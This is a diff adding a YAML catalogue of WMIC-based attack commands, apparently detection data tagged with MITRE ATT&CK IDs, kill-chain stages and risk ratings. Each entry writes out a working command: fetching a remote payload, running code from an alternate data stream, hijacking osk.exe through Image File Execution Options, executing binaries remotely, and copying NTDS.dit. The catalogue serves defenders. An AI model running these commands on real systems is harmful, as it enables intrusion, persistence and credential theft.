@@ -1,0 +1,167 @@
+- command: wmic os get /format:https://[PAYLOAD]
+  description: Utilize WMIC to retrieve a remote file.
+  executable:
+    - C:\Windows\System32\wbem\wmic.exe
+    - C:\Windows\SysWOW64\wbem\wmic.exe
+  killchain:
+    - Installation
+    - Delivery
+  mitre:
+    Defense Evasion:
+      - T1218
+    Command and Control:
+      - T1105
+    Execution:
+      - T1047
+  os:
+    - Windows
+  references:
+    - https://kwcsec.gitbook.io/the-red-team-handbook/techniques/execution/one-liners
+    - https://lolbas-project.github.io/lolbas/Binaries/Wmic/
+  risk: High
+  fidelity: High
+  tool: wmic
+  threatactors:
+    N/A:
+      - N/A
+- command: wmic.exe process call create "c:\ads\file.txt:program.exe"
+  description: Use wmic to execute a PE embedded in the alternate data stream of another file.
+  executable:
+    - C:\Windows\System32\wbem\wmic.exe
+    - C:\Windows\SysWOW64\wbem\wmic.exe
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1564.004
+      - T1218
+    Execution:
+      - T1047
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Wmic/
+  risk: High
+  fidelity: High
+  tool: wmic
+  threatactors:
+    N/A:
+      - N/A
+- command: wmic.exe process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
+  description: Add cmd.exe as a debugger for osk.exe - anytime osk.exe is run, cmd.exe will also execute.
+  executable:
+    - C:\Windows\System32\wbem\wmic.exe
+    - C:\Windows\SysWOW64\wbem\wmic.exe
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Persistence:
+      - T1546.012
+    Privilege Escalation:
+      - T1546.012
+    Defense Evasion:
+      - T1218
+    Execution:
+      - T1047
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Wmic/
+  risk: High
+  fidelity: High
+  tool: wmic
+  threatactors:
+    N/A:
+      - N/A
+- command: wmic.exe /node:"10.10.10.10" process call create "evil.exe"
+  description: Execute a binary on a remote host via wmic.
+  executable:
+    - C:\Windows\System32\wbem\wmic.exe
+    - C:\Windows\SysWOW64\wbem\wmic.exe
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+    Execution:
+      - T1047
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Wmic/
+  risk: High
+  fidelity: High
+  tool: wmic
+  threatactors:
+    N/A:
+      - N/A
+- command: wmic.exe /node:[COMPUTER] PROCESS call create "at 9:00PM c:\GoogleUpdate.exe ^> c:\notGoogleUpdateResults.txt"
+  description: Create a scheduled execution task on a remote device.
+  executable:
+    - C:\Windows\System32\wbem\wmic.exe
+    - C:\Windows\SysWOW64\wbem\wmic.exe
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Defense Evasion:
+      - T1218
+    Execution:
+      - T1047
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Wmic/
+  risk: High
+  fidelity: High
+  tool: wmic
+  threatactors:
+    N/A:
+      - N/A
+- command: wmic.exe /node:[COMPUTER] PROCESS call create "cmd /c vssadmin create shadow /for=C:\Windows\NTDS\NTDS.dit > c:\not_the_NTDS.dit"
+  description: Creation of a shadow copy and the subsequent copying of NTDS.dit using WMIC against a remote computer.
+  executable:
+    - C:\Windows\System32\wbem\wmic.exe
+    - C:\Windows\SysWOW64\wbem\wmic.exe
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Credential Access:
+      - T1003.003
+    Defense Evasion:
+      - T1218
+    Execution:
+      - T1047
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Wmic/
+  risk: High
+  fidelity: High
+  tool: wmic
+  threatactors:
+    N/A:
+      - N/A
+- command: wmic.exe process get brief /format:"\\127.0.0.1\c$\Tools\pocremote.xsl"
+  description: Execute JScript / VBScript embedded in a remote XSL stylesheet.
+  executable:
+    - C:\Windows\System32\wbem\wmic.exe
+    - C:\Windows\SysWOW64\wbem\wmic.exe
+  killchain:
+    - Actions on Objectives
+  mitre:
+    Credential Access:
+      - T1003.003
+    Defense Evasion:
+      - T1218
+    Execution:
+      - T1047
+  os:
+    - Windows
+  references:
+    - https://lolbas-project.github.io/lolbas/Binaries/Wmic/
+  risk: High
+  fidelity: High
+  tool: wmic
+  threatactors:
+    N/A:
+      - N/A
